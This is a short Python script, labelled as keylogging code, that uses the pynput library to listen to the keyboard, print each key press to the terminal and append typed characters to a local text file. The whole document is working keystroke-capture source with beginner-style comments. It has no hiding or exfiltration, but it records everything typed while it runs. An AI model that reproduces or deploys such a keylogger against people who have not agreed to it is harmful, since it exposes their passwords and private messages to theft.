#Keylogging code

#importing the necessary library
from pynput import keyboard

#function that takes the key as a parameter & converts even the input whether it's a number to string and outputs it to the terminal
def keyPressed(key):
    print(str(key))
    
    #create a file where the keyboard inputs are stored in a text file & is appended to the file
    with open("keyfile.txt", 'a') as logKey:
        try: 
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    #this is the event listener == checks what key was pressed and posts it
    listener = keyboard.Listener(on_press=keyPressed)
    #the listener starts immediately when the code runs and a key is pressed
    listener.start()
    #sent to terminal
    input()